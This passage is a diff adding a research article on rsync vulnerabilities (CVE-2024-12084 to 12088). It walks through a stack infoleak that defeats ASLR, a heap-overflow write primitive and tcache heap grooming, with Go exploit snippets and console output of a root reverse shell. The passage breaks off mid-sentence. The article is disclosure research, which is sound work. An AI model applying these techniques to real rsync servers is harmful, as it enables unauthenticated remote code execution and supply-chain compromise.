@@ -1,0 +1,2068 @@
+|=----------------------------------------------------------------------=|
+|=--------------=[ Desync the Planet - Rsync Remote Code ]=-------------=|
+|=---------------------------=[ Execution ]=----------------------------=|
+|=----------------------------------------------------------------------=|
+|=---------=[ Simon Scannell, Pedro Gallegos, Jasiel Spelman ]=---------=|
+|=----------------------------------------------------------------------=|
+
+0 - Introduction
+1 - Vulnerabilities
+2 - Technical Details
+    2.0.0 - Background - Rsync Architecture
+        2.0.1 - File Comparison Algorithm
+        2.0.2 - Rsync Workflow
+        2.0.3 - Rsync Server Connection Modes
+            2.0.3.0 - Daemon Mode
+            2.0.3.1 - SSH Mode
+    2.1.0 - Exploitation of Memory Corruption Vulnerabilities
+        2.1.1 - Background - Server Side Checksum Parsing
+        2.2.0 - Infoleak
+            2.2.1 - Breaking ASLR
+            2.2.2 - Speed vs Reliability of the Infoleak
+        2.3.0 - Heap Overflow
+            2.3.1 - Write-What-Where
+        2.4.0 - Heap Grooming
+            2.4.1 - Defragmenting the Heap and Consuming Tcache Entries
+            2.4.2 - Placing Target Objects Next to Each Other
+        2.5.0 - Achieving RIP Control and RCE
+        2.6.0 - Exploitation of Path Traversal Vulnerabilities
+            2.6.1 - Arbitrary File Write
+            2.6.2 - --safe-links Bypass
+            2.6.3 - Arbitrary File Read
+3 - Supply Chain Attack Scenarios
+    3.0.0 - Finding Vulnerable Servers
+    3.1.0 - Disclaimer and Assumptions We Make
+    3.2.0 - Precedent
+    3.3.0 - Attack Scenario: Missing Signatures
+        3.3.1 - melpa.org Compromised Mirror Can Serve Backdoored
+                Packages
+    3.4.0 - Attack Scenario: Exploiting Client-Side Vulnerabilities to
+            Bypass Signature Validation
+        3.4.1.0 - MacPorts RCE when Syncing from Compromised Mirror
+            3.4.1.1 - Creating Arbitrary Portfiles on Clients Machine from
+                      a Compromised Mirror
+    3.5.0 - Attack Scenario: Attacking CI/CD Infrastructure
+        3.5.1.0 - Attacking Rsync Servers Alongside Critical Services
+            3.5.1.1 - invent.kde.org
+4 - Conclusion
+5 - References
+6 - Proof-of-Concepts
+
+$./exploit rsync://example.com:873/files
+[*] Connected to example.com:873 on module files
+[*] Received file list
+[*] Downloaded target file 'foo': index 1, size 1417 (73a2bc1480ce5898)
+[*] Starting leak...
+[+] Leaked .text pointer 0x5572190ca847
+[*] base: 0x557219088000
+[*] shell_exec: 0x5572190b2a50
+[*] ctx_evp: 0x557219114a28
+[*] Spraying heap...
+[*] Setting up reverse shell listener...
+[*] Listening on port 1337
+[*] Sending payload...
+[+] Received connection! Dropping into shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+-- 0 - Introduction
+
+We found reliably exploitable memory corruption and path traversal issues
+in the file-syncing utility Rsync [1]. The memory corruption bugs allow an
+unauthenticated attacker to reliably execute arbitrary code on public
+Rsync servers. The path traversal issues allow a rogue Rsync server
+to read and write arbitrary files on clients' machines.
+
+Rsync is often deployed alongside HTTP and FTP services offered by package
+mirrors. There is a precedent of past attacks on Rsync,  where an attacker
+used a Rsync vulnerability to compromise a Gentoo mirror [2].
+In this report, we analyze different hypothetical scenarios of an attacker
+exploiting the vulnerabilities we found, and examine how protected supply
+chains are against a compromised upstream server.
+
+The Client-to-Server vulnerabilities are remotely exploitable in default
+configurations. An attacker only needs read access to a public instance,
+common for package mirrors.
+
+Depending on the software and protections running on a compromised server,
+an attacker could launch supply chain attacks. We will explore these
+scenarios and the vulnerable servers we confirmed.
+
+Alternatively, an attacker can take over trusted, public servers to
+read/write arbitrary files on clients' machines. They can extract
+sensitive data like SSH keys, or execute malicious code by overwriting
+files such as .bashrc, ~/.popt, or others.
+
+-- 1 - Vulnerabilities
+
+The following table provides a brief overview of the vulnerabilities we
+found.
+ 
++------------------+-----------------------+-----------------------------+
+| CVE              | Impact                | Description                 |
++------------------+-----------------------+-----------------------------+
+| CVE-2024-12084   | Heap Overflow         | Heap Buffer overflow in     |
+|                  |                       | Checksum comparison         |
+|                  |                       | server-side                 |
++------------------+-----------------------+-----------------------------+
+| CVE-2024-12085   | Info Leak             | Uninitialized stack buffer  |
+|                  |                       | contents can be leaked by   | 
+|                  |                       | client                      |
++------------------+-----------------------+-----------------------------+
+| CVE-2024-12086   | Arbitrary File Read   | The server is able to leak  |
+|                  |                       | arbitrary client files      |
++------------------+-----------------------+-----------------------------+
+| CVE-2024-12087   | Arbitrary File Write  | The server can make clients |
+|                  |                       | write files outside of      |
+|                  |                       | destination directory       |
++------------------+-----------------------+-----------------------------+
+| CVE-2024-12088   | Symlink Validation    | Improper handling of nested |
+|                  | Bypass                | symlinks allows bypass of   |
+|                  |                       | --safe-links                |
++------------------+-----------------------+-----------------------------+
+
+-- 2 - Technical Details
+
+The following sections will provide all the background knowledge required 
+to gain a general understanding of Rsync and follow along with the
+exploitation sections. We then discuss the discovered vulnerabilities and
+describe the exploit we developed.
+
+-- 2.0.0 - Background - Rsync architecture
+
+The following sections provide a simplified explanation of Rsync. A more
+comprehensive understanding can be obtained from the official project
+website (rsync.samba.org) and the original paper [9] that describes the
+algorithm. The background provided in this article is enough to understand
+the vulnerabilities and the exploits. We recommend reading through this
+section, as it explains the functions that will be referenced in the
+exploitation sections.
+
+-- 2.0.1 - File Comparison Algorithm
+
+The Rsync algorithm was designed to synchronize files between a source and
+destination, often on separate machines. Rsync achieves this by splitting
+existing files into chunks and only updating mismatching chunks or adding
+new chunks.
+
+The following graphic shows a file present in both the source and
+destination. By splitting the file into chunks, calculating a checksum for
+each chunk and comparing them, only a single chunk needs to be downloaded:
+
+/tmp/foo (Client)
++-----------+-----------+-----------+
+|  7f912f0  |  ae16850  |  5351f3d  |
++-----------+-----------+-----------+
+                  |
+                  x
+/tmp/foo (Server) | 
++-----------+-----------+-----------+
+|  7f912f0  |  e27c8bf  |  5351f3d  |
++----------+------------+-----------+
+
+-- 2.0.2 - Rsync Workflow
+
+When the client starts to sync from a server it first gets a list of files
+that will be offered. This list is called the file list and contains
+directories and files that are available in the server's source directory.
+The client receives this file list and decides which files it wants to
+update/download based on command line flags.
+
+At this point, the client process calls fork() and now works with two 
+processes: the generator and the receiver. The generator process is
+responsible for going through the file list the client received from the
+server and creating missing directories and, if enabled, symbolic links,
+devices and more. 
+
+The generator then goes through the regular files in the file list and
+checks if they already exist locally. If they do, it divides the file into
+an array of chunks and calculates two checksums for each of the chunks:
+
+* A 32-bit Adler-CRC32 Checksum
+* A digest of the file chunk. The digest algorithm is determined at the
+beginning of the protocol negotiation
+
+The generator then sends all chunks at once to the server, along with an
+index into the file list. This instructs the server to read the checksums
+and compare them against its own copy of the file. The server then sends
+the receiver, the second client process, a list of tokens. A token in this
+context is an instruction for the receiver process to either skip over a
+chunk when the chunks match or the server sends a stream of inline-data to
+overwrite mismatching chunks in the client's copy of the file. 
+
+The following graphic shows this workflow in action:
+
+                          +----------+
+                          |  Server  |
+                          +----------+
+                               ^
+                              / \
+                             /   \
+                            /     \
+    Keep chunk 1           /       \          Checksum 1
+    Keep chunk 2          /         \         Checksum 2
+    Inline Data for chunk #3         ...
+    ...                 /             \       Checksum N
+    Keep chunk N       /               \
++---------------------+                 +---------------------+
+|                     |                 |                     |
+|      Receiver       |<--------------->|     Generator       |
+|                     |Success / Failure|                     |
++---------------------+                 +---------------------+
+
+The receiver only communicates with the generator. It informs the
+generator about the success or failure of a single file transfer. This
+mechanism becomes important later.
+
+-- 2.0.3 - Rsync Server Connection Modes
+
+In this section, we will briefly describe two ways a Rsync client can
+connect to a Rsync server on a remote machine and how they affect the
+vulnerabilities we found. We will go into more detail about the individual
+bugs in later sections.
+
+-- 2.0.3.0 - Daemon Mode
+
+The same rsync binary that is used as a client CLI can be used to launch a
+server. To do so, it is sufficient to run it with rsync --daemon.
+ 
+Typically, the daemon listens on port 873 accepting plain TCP connections.
+In daemon mode, the server calls fork() on every new connection. Servers
+running in this mode can be scanned for on the internet. In October 2024,
+we found ~550,000 Rsync daemons exposed to the internet via Shodan.
+
+-- 2.0.3.1 - SSH Mode
+
+Rsync can be invoked on a remote machine over an SSH connection. This is
+done by running rsync on the remote host with special server flags. While
+the protocol differs slightly in this mode, the same synchronization logic
+is carried over the SSH channel.
+
+Although SSH access to the remote machine already implies access, in some
+cases SSH is configured to restrict access only to the rsync command to
+strictly specified flags. In such cases, the access is "sandboxed", as
+only the rsync binary can be launched. Such a setup is described, for
+example, by linux-audit.com:
+
+    command="rsync –server -vlogDtprCze.iLsfx –delete . \
+    /data/backups/system01",no-agent-forwarding,no-port-forwarding,\
+    no-pty,no-user-rc,no-X11-forwarding ssh-ed25519 AAAA........ \
+    backupuser for system1
+
+In such cases, the client to server RCE exploit we developed could be used
+to break out of this "sandbox". The same vulnerabilities can be triggered
+in this mode, although there are some exploitation differences that we
+will go into in later sections.
+
+-- 2.1.0 - Exploitation of Memory Corruption Vulnerabilities
+
+In the next sections, we will detail the memory safety issues we
+discovered in Rsync's server-side code. We will provide an overview of the
+server-side checksum parsing, which will provide the background knowledge
+required to understand the sections that follow. We will also detail the
+exploitation strategies we used to achieve reliable Remote-Code-Execution.
+
+The exploit we developed was written for the following binary running in 
+daemon mode with the default configuration:
+
+* Distro: Debian 12 Bookworm
+* Rsync version: 3.2.7-1 (At the time Bookworm stable)
+* MD5 of binary: 003765c378f66a4ac14a4f7ee43f7132
+
+-- 2.1.1 - Background - Server Side Checksum Parsing
+
+The server reads the checksums in the receive_sums() function. First,
+information about the checksums is read in the read_sum_head() function.
+We break down individual values and their meaning here:
+
+    /* Populate a sum_struct with values from the socket.  This is
+     * called by both the sender and the receiver. */
+    void read_sum_head(int f, struct sum_struct *sum)
+    {
+        int32 max_blength = protocol_version < 30 ? OLD_MAX_BLOCK_SIZE \
+                          : MAX_BLOCK_SIZE;
+        sum->count = read_int(f);
+        if (sum->count < 0) {
+            rprintf(FERROR, "Invalid checksum count %ld [%s]\n",
+                    (long)sum->count, who_am_i());
+            exit_cleanup(RERR_PROTOCOL);
+        }
+     ...
+     }
+
+count refers to the number of checksums that will follow. This corresponds
+to the number of chunks that the file is split into for synchronization.
+
+Next comes blength:
+
+    sum->blength = read_int(f);
+    if (sum->blength < 0 || sum->blength > max_blength) {
+        rprintf(FERROR, "Invalid block length %ld [%s]\n",
+                (long)sum->blength, who_am_i());
+        exit_cleanup(RERR_PROTOCOL);
+    }
+
+The blength tells the server the length of a chunk within the file, which
+are all the same length. The server will read blength bytes from a file,
+calculate a digest and compare it to the corresponding checksum the client
+sent.
+
+Next comes s2length:
+
+    sum->s2length = protocol_version < 27 ? csum_length
+                                          : (int)read_int(f);
+    if (sum->s2length < 0 || sum->s2length > MAX_DIGEST_LEN) {
+        rprintf(FERROR, "Invalid checksum length %d [%s]\n",
+                sum->s2length, who_am_i());
+        exit_cleanup(RERR_PROTOCOL);
+    }
+
+s2length corresponds to the actual digest length of an individual
+checksum. Because Rsync supports multiple checksums, (such as MD4, MD5,
+SHA1, XXHASH64) whose digest vary in size, the client uses s2length to
+tell the server how many digest bytes to expect. This field is important
+for the infoleak and the heap overflow discussed later. Interestingly, the
+client could not control this value before protocol version 27. 
+
+Finally, comes remainder:
+
+    sum->remainder = read_int(f);
+    if (sum->remainder < 0 || sum->remainder > sum->blength) {
+        rprintf(FERROR, "Invalid remainder length %ld [%s]\n",
+                (long)sum->remainder, who_am_i());
+        exit_cleanup(RERR_PROTOCOL);
+    }
+
+This value tells the server the length of the last chunk if it does not
+align to blength.
+
+After the daemon reads the header, two different checksums are read:
+
+(1) A 32-bit Adler-CRC32 Checksum
+(2) A digest of the file chunk. The digest algorithm is determined at the
+beginning of the protocol negotiation
+
+The corresponding code can be seen below:
+
+    s->sums = new_array(struct sum_buf, s->count);
+
+    for (i = 0; i < s->count; i++) {
+        s->sums[i].sum1 = read_int(f);
+        read_buf(f, s->sums[i].sum2, s->s2length);
+    ...
+    }
+
+-- 2.2.0 - Infoleak
+
+In hash_search(), the daemon matches the checksums of the chunks the
+client sent to the server against the local file contents. Part of the
+function prologue is to allocate a buffer on the stack of MAX_DIGEST_LEN
+bytes:
+
+    static void hash_search(int f, struct sum_struct *s,
+                            struct map_struct *buf, OFF_T len)
+    {
+        OFF_T offset, aligned_offset, end;
+        int32 k, want_i, aligned_i, backup;
+        char sum2[MAX_DIGEST_LEN];
+     ...
+    }
+
+MAX_DIGEST_LEN corresponds to the largest, supported digest algorithm:
+
+    #define MD4_DIGEST_LEN 16
+    #define MD5_DIGEST_LEN 16
+    #if defined SHA512_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA512_DIGEST_LENGTH
+    #elif defined SHA256_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA256_DIGEST_LENGTH
+    #elif defined SHA_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA_DIGEST_LENGTH
+    #else
+    #define MAX_DIGEST_LEN MD5_DIGEST_LEN
+    #endif
+
+Starting with commit ae16850 [10] rsync version 3.2.7, SHA512 was
+supported, which increased the value of MAX_DIGEST_LEN to 64.
+
+After the function setup is done, the daemon iterates over the checksums
+the client sent and generates a digest for the corresponding file chunk: 
+
+    if (!done_csum2) {
+        map = (schar *)map_ptr(buf,offset,l);
+        get_checksum2((char *)map,l,sum2);
+        done_csum2 = 1;
+    }
+
+    if (memcmp(sum2,s->sums[i].sum2,s->s2length) != 0) {
+        false_alarms++;
+        continue;
+    }
+
+This checksum is stored in the previously described sum2 stack buffer, and
+is generated through the map_ptr() function, which takes in a pointer to
+the files contents in memory, the file offset (which corresponds to
+chunkN * sum->blength), and the number of bytes to compare (which
+corresponds to blength). Under the hood, map_ptr() generates a digest for
+the chunk using an algorithm that was negotiated at the beginning of the
+protocol setup.
+
+The generated checksum is then compared against the corresponding
+attacker-controlled value. The number of bytes compared is s2length bytes.
+In this case, the comparison does not go out of bounds since s2length can
+be a maximum of MAX_DIGEST_LEN. 
+
+However, the local sum2 buffer is a buffer on the stack that is not
+cleared, and thus contains uninitialized stack contents.
+
+A malicious client could send a known xxhash64 checksum for a given chunk
+of a file, which leads to the daemon writing 8 bytes to the stack buffer
+sum2. The following image visualizes the contents of the sum2 buffer with
+this setup:
+                        sum2 stack buffer
++----------------------+-------------------------------------------------+
+| 8-bytes of checksum  | 56 bytes of uninitialized stack contents        |
++----------------------+-------------------------------------------------+
+
+The attacker can set s2length to 9 bytes. The result of such a setup would
+be that the first 8 bytes match and an attacker-controlled 9th byte is
+compared with an unknown value of uninitialized stack data. This is
+visualized by the following:
+
+                        sum2 stack buffer
++----------------------+----+--------------------------------------------+
+| 8-bytes of checksum  | ?? | 55 bytes of uninitialized stack contents   |
++----------------------+----+--------------------------------------------+
++---------------------------+
+| s2length = 9              |
++---------------------------+
+
+The server responds with different messages based on the comparison
+result. If the 9 bytes match, the server tells the client to keep the
+chunk. Otherwise, the server sends the data corresponding to the chunk
+directly to the client, as in the eyes of the server, the data on the
+server differs. 
+
+The attacker can send 256 different checksums, until the sum matches.
+Thus, the attacker can derive what the 9th byte (i.e. the 1st byte of 
+unknown stack data) from the server's behavior. The attacker can then
+incrementally repeat this process to leak more bytes from the stack
+buffer. Let's assume the attacker leaked the byte 0x47. While there are
+some constraints, which are detailed later, they can then continue the
+leak as more bytes of the stack are now known:
+
+                        sum2 stack buffer
++----------------------+------+----+-------------------------------------+
+| 8-bytes of checksum  | 0x47 | ?? | 54 bytes of uninitialized stack data|
++----------------------+------+----+-------------------------------------+
++----------------------------------+
+| s2length = 10                    |
++----------------------------------+
+
+As a result, they can leak MAX_DIGEST_LEN - 8 bytes of uninitialized stack
+data, which can contain pointers to Heap objects, stack cookies, local
+variables, pointers to global variables and return pointers. With those
+pointers they can defeat ASLR.
+
+-- 2.2.1 - Breaking ASLR
+
+In the case of the binary that we exploited, we were able to achieve a
+layout for the sum2 buffer where, starting at offset sum2+8, is a pointer
+into the .text section of the rsync binary:
+
+    (gdb) x/gx sum2+8
+    0x7fffffff7558: 0x00005555555596847
+    (gdb) x/gx 0x00005555555596847
+    0x5555555596847 <set_compression+599>: 0x058d48fffffef4e9
+    (gdb)
+
+The first 8 bytes of sum2 buffer are overwritten by the checksum of the
+target file, and the 8 bytes that are leaked immediately lead to a full
+bypass of ASLR. 
+
+Since an attacker can leak up to 56 bytes of stack contents, it is very
+likely that this infoleak can also be ported to other binaries and
+environments. An attacker can trigger different stack frames before the
+entry into hash_search(), for example by triggering allocations or
+initializing different compression algorithms.
+
+-- 2.2.2 - Speed vs Reliability of the Infoleak
+
+In theory, the infoleak algorithm previously described can be optimized by
+splitting a file into 256 different chunks and performing the oracle with
+256 different values. Then, the client can observe which of the 256 chunks
+matched on the server side and derive the stack contents from that. That
+would mean that a single byte can be leaked per file request.
+
+In addition, a client can repeatedly request the same file over and over
+again from the server. In theory, an attacker can leak the entire stack
+contents in a single connection. However, this comes at the cost of
+reliability of the infoleak as the stack contents may contain dynamic data
+such as heap pointers or other local variables that change based on the
+overall state of the program. As such, the previously disclosed stack
+contents may change and thus the incremental bruteforce of data may not
+work.
+
+For our Proof-of-Concept exploit, we decided on maximum reliability and
+portability which is achieved by attempting a single oracle step 
+per-connection. The logic here is based on the fact that the rsync daemon
+runs in a fork() loop. Assuming a system where glibc's allocator is used,
+the heap layout is deterministic. If we send the exact same packets
+leading up to the hash_search() function being called, the stack frames
+will always be exactly the same. As a result, the incremental brute-force
+is slower but values are more likely to stay static.
+
+-- 2.3.0 - Heap Overflow
+
+The Heap Buffer Overflow we found can also be triggered through an
+attacker-controlled s2length value. As a reminder, here is the snippet
+where the actual digest is read from the connection to the client:
+
+    s->sums = new_array(struct sum_buf, s->count);
+
+    for (i = 0; i < s->count; i++) {
+        s->sums[i].sum1 = read_int(f);
+        read_buf(f, s->sums[i].sum2, s->s2length);
+      ...
+    }
+
+Most importantly, note that the sum2 field is filled with s->s2length
+bytes. sum2 always has a size of 16:
+
+#define SUM_LENGTH 16
+// ...
+struct sum_buf {
+        OFF_T offset;           /**< offset in file of this chunk */
+        int32 len;              /**< length of chunk of file */
+        uint32 sum1;            /**< simple checksum */
+        int32 chain;            /**< next hash-table collision */
+        short flags;            /**< flag bits */
+        char sum2[SUM_LENGTH];  /**< checksum  */
+};
+
+s2length is an attacker-controlled value and can have a value up to
+MAX_DIGEST_LEN bytes, as the next snippet shows:
+
+    sum->s2length = protocol_version < 27 ? csum_length
+                                          : (int)read_int(f);
+    if (sum->s2length < 0 || sum->s2length > MAX_DIGEST_LEN) {
+        rprintf(FERROR, "Invalid checksum length %d [%s]\n",
+                sum->s2length, who_am_i());
+        exit_cleanup(RERR_PROTOCOL);
+    }
+
+The problem here is that MAX_DIGEST_LEN can be larger than 16 bytes,
+depending on the digest support the binary was compiled with. As
+previously mentioned, MAX_DIGEST_LEN is defined as follows:
+
+    #define MD4_DIGEST_LEN 16
+    #define MD5_DIGEST_LEN 16
+    #if defined SHA512_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA512_DIGEST_LENGTH
+    #elif defined SHA256_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA256_DIGEST_LENGTH
+    #elif defined SHA_DIGEST_LENGTH
+    #define MAX_DIGEST_LEN SHA_DIGEST_LENGTH
+    #else
+    #define MAX_DIGEST_LEN MD5_DIGEST_LEN
+    #endif
+
+SHA512 support sets the MAX_DIGEST_LENGTH value to 64. As a result, an
+attacker can write up to 48 bytes past the sum2 buffer limit.
+
+It appears that the heap buffer overflow was introduced with commit
+ae16850 [11], as this commit introduced support for SHA256 and SHA512.
+Although these algorithms are only used for authentication, they still
+increased the value of MAX_DIGEST_LEN beyond SUM_LEN.
+
+-- 2.3.1 - Write-What-Where
+
+We found a structure, used in the same function in which the buffer
+overflow occurred, that could cause an arbitrary-write primitive. The
+following snippet has been modified for clarity:
+
+    (1) s->sums = new_array(struct sum_buf, s->count);
+
+    for (i = 0; i < (2) s->count; i++) {
+        s->sums[i].sum1 = read_int(f);
+        (3) read_buf(f, s->sums[i].sum2, (4) s->s2length);
+        ...
+    }
+
+Let's break down the code snippet above:
+
+(1) An array of size (sizeof(struct sum_buf) * s->count)) is allocated and
+stored as s->sums. s->count is an arbitrary positive 32-bit integer that
+is attacker controlled. We then see (2) s->count also being used as a loop
+limit. Within the loop, we read (3) bytes directly from the network
+connection into the sum2 buffer of each sum_buf entry within s->sums. The
+number of bytes corresponds to (4) s->s2length bytes.
+
+As you may remember, sum_buf is defined as the following:
+
+    #define SUM_LENGTH 16
+    // . . .
+    struct sum_buf {
+        OFF_T offset;           /**< offset in file of this chunk */
+        int32 len;              /**< length of chunk of file */
+        uint32 sum1;            /**< simple checksum */
+        int32 chain;            /**< next hash-table collision */
+        short flags;            /**< flag bits */
+        char sum2[SUM_LENGTH];  /**< checksum  */
+    };
+
+The size of sum2 is always 16, as was previously discussed. Assuming a 
+MAX_DIGEST_LEN of 64, we could have overflown up to 48 bytes past the last 
+entry of the s->sums array. The overflow would have happened in the last
+iteration of the for loop controlled by s->count. We can visualize the
+overflow as the following:
+
++---------------------+---------------------+
+|    struct sum_buf   |    struct sum_buf   |
++--------------+------+--------------+------+----------------------------+
+| other fields | sum2 | other fields | sum2 |AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
++--------------+------+--------------+------+----------------------------+
+
+Since we could only overflow 48 bytes past the last sum_buf entry, along
+with libc metadata of chunks (16-bytes), we had to look for a small object
+that gets allocated on the Heap or an object that contains interesting
+members in their first 32 bytes. 
+
+As it turned out, the sum_struct structure was perfect for this as it
+contains interesting fields inside a small object. We can also allocate it
+right before the sum_buf array, and it's used in the same function in
+which the heap buffer overflow is triggered:
+
+    struct sum_struct {
+        OFF_T flength;          /**< total file length */
+        struct sum_buf *sums;   /**< points to info for each chunk */
+        int32 count;            /**< how many chunks */
+        int32 blength;          /**< block_length */
+        int32 remainder;        /**< flength % block_length */
+        int s2length;           /**< sum2_length */
+    };
+
+The size of the struct is 32-bytes, which is exactly the amount of bytes
+we can write. This means we can overwrite all the fields in the struct.
+
+Refer back to the loop at the start of this section. We can only overflow
+sum2, the last member of the sum_buf struct. However, if we have a heap
+layout as the follows, we can set the count member to an arbitrary value
+and thus keep the loop going:
+
++---------------------+---------------------+----------------------------+
+|    struct sum_buf   |    struct sum_buf   |        struct sum_struct   |
++--------------+------+--------------+------+----------------------------+
+| other fields | sum2 | other fields | sum2 |AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
++--------------+------+--------------+------+----------------------------+
+
+Within the additional loop iterations triggered by overwriting s->count,
+we can overwrite s->sums so that it points to an arbitrary memory
+location. We can also overwrite s->s2length and set it to an arbitrary
+size. Hence, we can write an arbitrary amount of attacker-controlled bytes
+to an arbitrary location.
+
+-- 2.4.0 - Heap Grooming
+
+In the upcoming sections we will discuss some of the properties of Rsync's
+heap state. We provide a simplified background on glibc's allocator
+behavior, which is necessary to understand the heap grooming techniques we
+used for this exploit. For more information on the glibc heap
+implementation, we recommend Azeria's blog posts [12] on the topic.
+
+-- 2.4.1 - Defragmenting the Heap and Consuming Tcache Entries
+
+We developed a Proof-of-Concept exploit for Rsync running in daemon mode.
+During startup, the daemon reads and parses its configuration file and
+turns on logging. This triggers a series of allocations and frees whose
+exact pattern can't be predicted by an attacker without knowledge of the
+configuration. In addition, the attacker has no control over the server’s
+file list, so Rsync performs further unpredictable allocations and
+deallocations of various sizes. Due to this, we must assume a fragmented
+heap with many small, scattered free chunks in unknown locations. 
+
+The heap state can be visualized as follows:
+
++----------+---+--------------+---+----------+---------------------------+
+|  large,  | * |    large,    | * |  large,  |                           |
+|  in-use  | * |    in-use    | * |  in-use  |          top chunk        |
+|  chunk   | * |    chunk     | * |  chunk   |                           |
++----------+---+--------------+---+----------+---------------------------+
+
+As depicted above, the large chunks in use represent larger allocations,
+for example buffers for logging. Whenever malloc() is called, the glibc
+allocator tries to find an existing free chunk. If it can't, it creates a
+new chunk from the top chunk. If not enough space is available in the top
+chunk, it is extended through either sbrk() or mmap() or other system
+calls. The chunks denoted with an asterisk (*) represent smaller, free
+chunks that are stored in the so-called tcache.
+
+An allocation of 1032 bytes or less always searches the tcache first for
+an available chunk. The tcache is a small LIFO queue of chunks with
+special behaviour; for example, unlike other chunks, tcache chunks do not
+get consolidated with neighboring free chunks. The tcache strikes a
+balance between heap fragmentation and fast allocations. To maintain this
+balance, only a limited number of chunks (by default 7) are added to the
+tcache.
+
+The primary issue we faced in creating the desired heap state was that,
+upon connecting to the server, we had to assume a fragmented heap with
+free tcache chunks in unknown locations. Because the sizes of our target
+objects fall within this range, we first needed to defragment the heap by
+consuming all free tcache chunks.
+
+In our exploit, we achieved this by creating many small allocations are
+held in memory until the end of the process. By doing this, all available
+tcache chunks are consumed:
+
+    // Consume all possible entries in tcache
+    for i := tcacheMin; i <= tcacheMax; i += tcacheStep {
+        for j := 0; j < tcacheSlots*2; j++ {
+            client.WriteLine("-M-" + strings.Repeat("A", i-2))
+        }
+    }
+
+The snippet above shows code that runs during the protocol setup phase.
+The client sends the server options that influence the server's behavior
+for the file transfer. By sending option values, we can make the server
+copy them to memory and keep them there for the lifetime of the process.
+
+The following depicts a possible heap state after the defragmentation:
+
++----------+---+--------------+---+----------+---+-----------------------+
+|          | x |              | x |          | x | x | x |               |
+|  large,  | x |    large,    | x |  large,  | x | x | x |               |
+|  in-use  | x |    in-use    | x |  in-use  | x | x | x |  top chunk    |
+|  chunk   | x |    chunk     | x |  chunk   | x | x | x |               |
+|          | x |              | x |          | x | x | x |               |
++----------+---+--------------+---+----------+---------------------------+
+
+The chunks denoted with an (x) now represent in-use chunks that are in the
+tcache range. Another side effect of the defragmentation is that all
+available chunks are consumed, so new chunks are placed consecutively next
+to each other at the end of the Heap. This created the conditions under
+which we could perform allocations and deallocations in an order that
+leads to the desired heap state, as discussed in the next section.
+
+-- 2.4.2 - Placing Target Objects Next to Each Other
+
+There aren't many chances to perform arbitrary allocations and frees
+before the overflow occurs. While examining the code paths that precede
+the overflow, we came across filter rule handling. Clients can instruct
+the server to exclude or include certain files by sending a list of
+filters. Typically, these filters are supplied as command line options,
+for example --filter=+/dir/**. However, filters can also be sent to the
+server after command line parsing, in a different part of the protocol
+setup. On the server side, the filter rules are parsed by the
+recv_filter_list() function. Sending filters in this dedicated protocol
+section reduces any additional, uncontrolled allocations.
+
+In our exploit code, we sent the following filters:
+
+    // Send Filters
+    count := 5
+    filter := "+ " + strings.Repeat("Z", ((count)*sumBufStructSize)-1)
+    clr := "!"
+
+    // The filter pattern is the size we'll allocate in receive_sums
+    client.WriteRawInt(len(filter) + 1)
+    client.WriteLine(filter)
+
+    // This will allocate a filter_rule after our pattern
+    filter = "+ a"
+    client.WriteRawInt(len(filter) + 1)
+    client.WriteLine(filter)
+
+    // Send the clear flag to free filters
+    client.WriteRawInt(len(clr) + 1)
+    client.WriteLine(clr)
+    client.WriteRawInt(0)
+
+Each filter will allocate a filter_rule struct, which is the same size as
+struct sum_buf (40 bytes). With each filter, we can specify a path string
+of a controlled size, which allows us to perform another allocation. The
+first filter we allocate will therefore allocate a filter_rule struct and
+a string of size count*sumBufStructSize, resulting in 200 bytes. We chose
+the value 5 for count, as it turned out to be reliable after some
+experimentation. sumBufStructSize is a constant equal to 40.
+
+Then we send a single byte filter a, which leads to another filter_rule
+allocation of 40 bytes. Now have a heap layout depicted by the following:
+
++--------------------+--------------------------+--------------------+---+
+| filter_rule struct |  zzzzzzzzzzzzzzzzzzzzzzz | filter_rule struct | a |
+| (40 bytes)         |  zzzzzzzzzzzzzzzzzzzzz...| (40 bytes)         |   |
+|                    |    (200 bytes)           |                    |   |
++--------------------+--------------------------+--------------------+---+
+
+While we can not cause the deallocation of a single filter, we can free
+all of them at the same time by sending the string !. As seen in the code
+snippet above, this causes all filters and their associated strings to be
+deallocated all at once, in the order that they were allocated. This now
+leads to the following layout of available tcache chunks:
+
+Top of ~200 byte tcache bucket      Top of ~40 byte tcache bucket
+           -----\                           ----\           
+                 -------------\                  -------\ 
++----------------+-------------------------------+----------------+------+
+|                |                               |                |      |
+| 40 byte tcache |    200 byte tcache entry      | 40 byte tcache | 8    |
+| entry          |                               | entry          | byte |
+|                |                               |                | entry|
++----------------+-------------------------------+----------------+------+
+
+Since the filter_rule structs and associated strings are deallocated left
+to right, and the tcache has a LIFO structure, the second filter_rule
+chunk becomes the top of the 40-byte tcache bucket. Since only one 200
+byte chunk is allocated and deallocated, it also becomes the top of its
+tcache bucket. As a result, the next 200 byte and 40 byte allocations will
+be placed in these slots. 
+
+We can cause this exact order of allocations to occur. In receive_sums(),
+the struct sum_struct is allocated first, which consumes the top of the 40
+byte tcache bucket. An allocation of 200 bytes occurs if s->count is 5:
+
+    struct sum_struct *s = new(struct sum_struct);
+    int lull_mod = protocol_version >= 31 ? 0 : allowed_lull * 5;
+    OFF_T offset = 0;
+    int32 i;
+
+    read_sum_head(f, s);
+
+    s->sums = NULL;
+
+    // ...
+
+    if (s->count == 0)
+        return(s);
+
+    s->sums = new_array(struct sum_buf, s->count);
+
+As a result, we can achieve the desired heap layout, as depicted below:
+
++-----------------+------------------------------+----------------+------+
+|  40 byte tcache |    struct sum_buf array      | struct         | 8    |
+|  entry          |    (200 bytes)               | sum_struct     | byte |
+|                 |                              | (40 bytes)     | entry|
++-----------------+------------------------------+----------------+------+
+
+With the heap layout achieved, the only thing left to finish the exploit
+is to craft the final payload.
+
+-- 2.5.0 - Achieving RIP control and RCE
+
+With the Write-What-Where primitive achieved, we then had to look for a
+way to achieve Remote-Code-Execution.
+
+The Rsync codebase heavily relies on global variables to manage its state.
+This state is unique to each connection because the Rsync daemon calls
+fork() to handle a every connection. As a result of Rsync's reliance on
+globals, we knew that gaining an Arbitrary-Write primitive would most
+likely yield Remote-Code-Execution.
+
+We found a global variable, ctx_evp that was a pointer to an OpenSSL
